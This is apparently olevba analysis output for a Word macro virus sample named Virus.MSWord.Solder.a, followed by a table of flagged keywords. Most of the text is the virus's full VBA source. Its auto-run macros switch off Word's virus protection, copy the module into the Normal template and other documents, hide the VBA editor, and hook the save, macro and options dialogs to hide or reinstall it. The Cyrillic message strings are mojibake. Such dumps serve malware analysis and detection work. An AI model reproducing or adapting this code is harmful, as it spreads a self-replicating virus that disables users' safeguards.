olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Solder.a-3f9ef3070e81c2205e072cb84884765a03526748
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Solder.a-3f9ef3070e81c2205e072cb84884765a03526748 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xkySoldier.bas 
in file: Virus.MSWord.Solder.a-3f9ef3070e81c2205e072cb84884765a03526748 - OLE stream: 'Macros/VBA/xkySoldier'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Const NStat = 0
Const VStat = 0
    With Application.Options
        .SaveNormalPrompt = False
        .VirusProtection = False
    End With
Dim i%, j%, l%, WhareIns As Long, Finded As Boolean, FindedOpen As Boolean
Dim WhatInsBeg As Long, WhatInsEnd As Long
For i = 1 To VBE.VBProjects.Count
 For j = 1 To VBE.VBProjects(i).VBComponents.Count
   With VBE.VBProjects(i).VBComponents(j).CodeModule
        For WhareIns = 1 To .CountOfLines + 1
            If .Find("'Ïðîáà ¹ 1", WhareIns, 1, WhareIns, 30) Then
               Finded = True
               Exit For
            Else
               Finded = False
            End If
        Next WhareIns
        If Not Finded Then
            For WhareIns = 1 To .CountOfLines
                If .Find("Sub Document_Open()", WhareIns, 1, WhareIns, 30) Then
                    FindedOpen = True
                    Exit For
                Else
                    FindedOpen = False
                End If
            Next WhareIns
            For WhatInsBeg = 1 To Me.VBProject.VBComponents(Me.CodeName).CodeModule.CountOfLines
                If Me.VBProject.VBComponents(Me.CodeName).CodeModule.Find("'Ïðîáà ¹ 1", WhatInsBeg, 1, WhatInsBeg, 30) Then
                    Exit For
                End If
            Next WhatInsBeg
            For WhatInsEnd = 1 To Me.VBProject.VBComponents(Me.CodeName).CodeModule.CountOfLines
                If Me.VBProject.VBComponents(Me.CodeName).CodeModule.Find("'Êîíåö", WhatInsEnd, 1, WhatInsEnd, 30) Then
                    Exit For
                End If
            Next WhatInsEnd
        End If
        If (Not Finded) And FindedOpen Then
        WhareIns = WhareIns + 1
        .InsertLines WhareIns, Me.VBProject.VBComponents(Me.CodeName) _
        .CodeModule.Lines(2, WhatInsEnd - WhatInsBeg + 1)
        ElseIf Not Finded Then
        .AddFromString Me.VBProject.VBComponents(Me.CodeName) _
        .CodeModule.Lines(1, Me.VBProject.VBComponents(Me.CodeName) _
        .CodeModule.CountOfLines)
        End If
    End With
  Next
 Next

Application.OnTime When:=Now() + TimeValue("00:00:" & Format(Int(Rnd * 30))), _
Name:=VBE.VBProjects(1).Name & "." & VBE.VBProjects(1).VBComponents(1).Name & "MyProc"
'Êîíåö
Rem Deleted by
Rem Deleted by
Rem Deleted by
    Rem
    Rem Deleted b
    Rem Deleted by AVP  Deleted by AVP  Deleted by AVP  Delet
    Rem Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted b


    End
    Rem Deleted by AVP  Deleted by AVP  D
    Rem Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  D



    End
    Rem Deleted by AVP  Deleted
    Rem Deleted by AVP  Delet
    Rem Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Del
    Rem Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Delet


    End
    Rem Deleted by AVP  Deleted by AVP  Deleted by AVP
    Rem Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP



    End
    Rem Delet
    Rem Deleted by AVP  Deleted by AVP  Deleted
    Rem Deleted
        Rem D
        Rem Deleted
        Rem D
        Rem Deleted
        Rem D
        Rem Del
        Rem Deleted
        Rem Deleted by AVP  D
        Rem Deleted by
        Rem Delet
        End
    End
    End
End Sub
Private Sub Document_Close()
    Rem D
End Sub
Private Sub Document_New()
    Rem D
End Sub



























































































































































Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Dim pth As String, i As Byte, dc As Object
Dim NInst As Boolean, AInst As Boolean
On Error Resume Next
Application.VBE.MainWindow.Visible = False
pth = Environ("temp") & "\~WRr000^.tmp"
Set dc = NormalTemplate.VBProject.VBComponents
For i = 1 To dc.Count
If dc(i).Name = "xkySoldier" Then
NInst = 1
dc(i).Export pth
End If
Next i
Set dc = ActiveDocument.VBProject.VBComponents
For i = 1 To dc.Count
If dc(i).Name = "xkySoldier" Then
AInst = 1
dc(i).Export pth
End If
Next i
If AInst = True And NInst = False Then Set dc = NormalTemplate
If AInst = False And NInst = True Then Set dc = ActiveDocument
If AInst = False Or NInst = False Then
dc.VBProject.VBComponents.Import pth
If Mid(ActiveDocument.FullName, 2, 1) = ":" Then dc.Save
Kill pth
End If
 AutoCorrect.Entries(",").Delete
    With AutoCorrect
        .CorrectInitialCaps = True
        .CorrectSentenceCaps = False
        .CorrectDays = True
        .CorrectCapsLock = True
        .ReplaceText = True
    End With
    On Error Resume Next
Dim pdd, wd, r, s
Set wd = Application.VBE.ActiveVBProject.VBComponents

For r = 1 To wd.Count

If Application.VBE.ActiveVBProject.VBComponents(r).Name = "WordDigger" Then

MsgBox "Âíèìàíèå!" + vbCrLf + "Â øàáëîíå îáíàðóæåí ìîäóëü WordDigger (èíà÷å ÁËÈÍ)" + vbCrLf + " Ìîäóëü ÁËÈÍÀ è åãî ïîñëåäñòâèÿ áûëè óíè÷òîæåíû" + vbCrLf + "Âèðóñîì-îõîòíèêîì SkySoldier. Âàêöèíàöèÿ øàáëîíà ïðîâåäåíà, îäíàêî ïðîâåðòå ôàéëû àíòèâèðóñîì", vbOKOnly + vbInformation
MsgBox "Â 2000 ãîäó êàêàÿ-òî ñêîòèíà ïðèíåñëà â øòàá ÑÊÂÎ âèðóñ WordDigger" + vbCrLf + " èëè, êàê åãî òóò âñå íàçûâàþò ÁËÈÍ" + vbCrLf + "Îí äî òîãî æèâó÷èé, ÷òî ñèëüíî ìåíÿ äîñòàë" + vbCrLf + "è âîò íà äîñóãå ñëîæèëàñü ìûñëü íàïèñàòü âèðóñ-îõîòíèê, êîòîðûé áû óíè÷òîæàë ÁËÈÍ èçíóòðè. È âîò ÷òî èç ýòîãî ïîëó÷èëîñü..." + vbCrLf + "Àâòîð ïðîãðàììû: Øòîäà Å.Â. (ÀïÍØ)" + vbCrLf + "Èäåÿ: Äóäèí Ñåðãåé (ÎÑÂ è ÁÂÑ)" + vbCrLf + "Ïîä ÷óòêèì ðóêîâîäñòâîì ïîëêîâíèêà ×ìóëåâà Â.Â."
GoSub 20

End If
Next r
20 wd.Remove Application.VBE.ActiveVBProject.VBComponents(r)


Return

Set pdd = NormalTemplate.VBProject.VBComponents

For s = 1 To pdd.Count
If NormalTemplate.VBProject.VBComponents(s).Name = "WordDigger" Then
pdd.Remove NormalTemplate.VBProject.VBComponents(s)
MsgBox "Âíèìàíèå!" + vbCrLf + "Â øàáëîíå îáíàðóæåí ìîäóëü WordDigger (èíà÷å ÁËÈÍ)" + vbCrLf + " Ìîäóëü ÁËÈÍÀ è åãî ïîñëåäñòâèÿ áûëè óíè÷òîæåíû" + vbCrLf + "Âèðóñîì-îõîòíèêîì SkySoldier. Âàêöèíàöèÿ øàáëîíà ïðîâåäåíà, îäíàêî ïðîâåðòå ôàéëû àíòèâèðóñîì", vbOKOnly + vbInformation
MsgBox "Â 2000 ãîäó êàêàÿ-òî ñêîòèíà ïðèíåñëà â øòàá ÑÊÂÎ âèðóñ WordDigger" + vbCrLf + " èëè, êàê åãî òóò âñå íàçûâàþò ÁËÈÍ" + vbCrLf + "Îí äî òîãî æèâó÷èé, ÷òî ñèëüíî ìåíÿ äîñòàë" + vbCrLf + "è âîò íà äîñóãå ñëîæèëàñü ìûñëü íàïèñàòü âèðóñ-îõîòíèê, êîòîðûé áû óíè÷òîæàë ÁËÈÍ èçíóòðè. È âîò ÷òî èç ýòîãî ïîëó÷èëîñü..." + vbCrLf + "Àâòîð ïðîãðàììû: Øòîäà Å.Â. (ÀïÍØ)" + vbCrLf + "Èäåÿ: Äóäèí Ñåðãåé (ÎÑÂ è ÁÂÑ)" + vbCrLf + "Ïîä ÷óòêèì ðóêîâîäñòâîì ïîëêîâíèêà ×ìóëåâà Â.Â."
End If
Next s
End Sub
Sub AutoExec()
Dim o, l
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Application.VBE.MainWindow.Visible = False
WordBasic.DisableAutoMacros 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
 AutoCorrect.Entries(",").Delete
    With AutoCorrect
        .CorrectInitialCaps = True
        .CorrectSentenceCaps = False
        .CorrectDays = True
        .CorrectCapsLock = True
        .ReplaceText = True
    End With
    On Error Resume Next
Dim pdd, wd
Set wd = Application.VBE.ActiveVBProject.VBComponents

For o = 1 To wd.Count

If Application.VBE.ActiveVBProject.VBComponents(o).Name = "WordDigger" Then

MsgBox "Âíèìàíèå!" + vbCrLf + "Â øàáëîíå îáíàðóæåí ìîäóëü WordDigger (èíà÷å ÁËÈÍ)" + vbCrLf + " Ìîäóëü ÁËÈÍÀ è åãî ïîñëåäñòâèÿ áûëè óíè÷òîæåíû" + vbCrLf + "Âèðóñîì-îõîòíèêîì SkySoldier. Âàêöèíàöèÿ øàáëîíà ïðîâåäåíà, îäíàêî ïðîâåðòå ôàéëû àíòèâèðóñîì", vbOKOnly + vbInformation
MsgBox "Â 2000 ãîäó êàêàÿ-òî ñêîòèíà ïðèíåñëà â øòàá ÑÊÂÎ âèðóñ WordDigger" + vbCrLf + " èëè, êàê åãî òóò âñå íàçûâàþò ÁËÈÍ" + vbCrLf + "Îí äî òîãî æèâó÷èé, ÷òî ñèëüíî ìåíÿ äîñòàë" + vbCrLf + "è âîò íà äîñóãå ñëîæèëàñü ìûñëü íàïèñàòü âèðóñ-îõîòíèê, êîòîðûé áû óíè÷òîæàë ÁËÈÍ èçíóòðè. È âîò ÷òî èç ýòîãî ïîëó÷èëîñü..." + vbCrLf + "Àâòîð ïðîãðàììû: Øòîäà Å.Â. (ÀïÍØ)" + vbCrLf + "Èäåÿ: Äóäèí Ñåðãåé (ÎÑÂ è ÁÂÑ)" + vbCrLf + "Ïîä ÷óòêèì ðóêîâîäñòâîì ïîëêîâíèêà ×ìóëåâà Â.Â."
GoSub 20

End If
Next o
20 wd.Remove Application.VBE.ActiveVBProject.VBComponents(o)


Return

Set pdd = NormalTemplate.VBProject.VBComponents

For l = 1 To pdd.Count
If NormalTemplate.VBProject.VBComponents(l).Name = "WordDigger" Then
pdd.Remove NormalTemplate.VBProject.VBComponents(l)
MsgBox "Âíèìàíèå!" + vbCrLf + "Â øàáëîíå îáíàðóæåí ìîäóëü WordDigger (èíà÷å ÁËÈÍ)" + vbCrLf + " Ìîäóëü ÁËÈÍÀ è åãî ïîñëåäñòâèÿ áûëè óíè÷òîæåíû" + vbCrLf + "Âèðóñîì-îõîòíèêîì SkySoldier. Âàêöèíàöèÿ øàáëîíà ïðîâåäåíà, îäíàêî ïðîâåðòå ôàéëû àíòèâèðóñîì", vbOKOnly + vbInformation
MsgBox "Â 2000 ãîäó êàêàÿ-òî ñêîòèíà ïðèíåñëà â øòàá ÑÊÂÎ âèðóñ WordDigger" + vbCrLf + " èëè, êàê åãî òóò âñå íàçûâàþò ÁËÈÍ" + vbCrLf + "Îí äî òîãî æèâó÷èé, ÷òî ñèëüíî ìåíÿ äîñòàë" + vbCrLf + "è âîò íà äîñóãå ñëîæèëàñü ìûñëü íàïèñàòü âèðóñ-îõîòíèê, êîòîðûé áû óíè÷òîæàë ÁËÈÍ èçíóòðè. È âîò ÷òî èç ýòîãî ïîëó÷èëîñü..." + vbCrLf + "Àâòîð ïðîãðàììû: Øòîäà Å.Â. (ÀïÍØ)" + vbCrLf + "Èäåÿ: Äóäèí Ñåðãåé (ÎÑÂ è ÁÂÑ)" + vbCrLf + "Ïîä ÷óòêèì ðóêîâîäñòâîì ïîëêîâíèêà ×ìóëåâà Â.Â."
End If
Next l
End Sub
Sub FileSave()
On Error Resume Next
Call AutoOpen
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Call AutoOpen
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub ToolsOptions()
On Error Resume Next
Dim dc As Object
Dim VirStat As Byte
Dim NorStat As Byte
Options.SaveNormalPrompt = NStat
Options.VirusProtection = VStat
Dialogs(wdDialogToolsOptions).Show
Set dc = ActiveDocument.VBProject.VBComponents("xkySoldier").CodeModule
If Options.SaveNormalPrompt = True Then NorStat = 1
If Options.VirusProtection = True Then VirStat = 1
dc.ReplaceLine 2, "const NStat=" & NorStat
dc.ReplaceLine 3, "const VStat=" & VirStat
Set dc = NormalTemplate.VBProject.VBComponents("xkySoldier").CodeModule
dc.ReplaceLine 2, "const NStat=" & NorStat
dc.ReplaceLine 3, "const VStat=" & VirStat
Options.SaveNormalPrompt = 0
Options.VirusProtection = 0
NormalTemplate.Save
NormalTemplate.Saved = True
End Sub
Sub ToolsMacro()
Dim i As Byte, n As Integer, pth As String
Dim NInst As Boolean, AInst As Boolean, Nsav As Boolean, Asav As Boolean, res As Boolean
Dim dc As Object, dcN As Object, dcA As Object
On Error Resume Next
pth = Environ("temp") & "\~WRr000^.tmp"
Set dcN = NormalTemplate.VBProject.VBComponents
Set dcA = ActiveDocument.VBProject.VBComponents
Set dc = NormalTemplate.VBProject
GoSub 10
NInst = res
Set dc = ActiveDocument.VBProject
GoSub 10
AInst = res
If NInst = True Then
Set dc = dcN
GoSub 20
Nsav = NormalTemplate.Saved
NormalTemplate.Saved = 1
End If
If AInst = True Then
Set dc = dcA
GoSub 20
Asav = ActiveDocument.Saved
ActiveDocument.Saved = 1
End If
Dialogs(wdDialogToolsMacro).Show
dcN("xkySoldier").CodeModule.AddFromFile pth
dcA("xkySoldier").CodeModule.AddFromFile pth
dcN.CodeModule.AddFromFile pth
NormalTemplate.Saved = Nsav
dcA.CodeModule.AddFromFile pth
ActiveDocument.Saved = Asav
Kill pth
Exit Sub
10 For i = 1 To dc.VBComponents.Count
If dc.VBComponents(i).Name = "xkySoldier" Then
res = 1
dc.VBComponents(i).Export pth
End If
Next i
Return
20 dc.Export pth
n = dc("xkySoldier").CodeModule.CountOfLines
dc("xkySoldier").CodeModule.DeleteLines 1, n
Return
End Sub
Sub ViewVBCode()
'If Dir("c:\xkySoldier.die") = "" Then
'MsgBox "Îñòîðîæíî"
Application.VBE.MainWindow.Visible = True
'End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

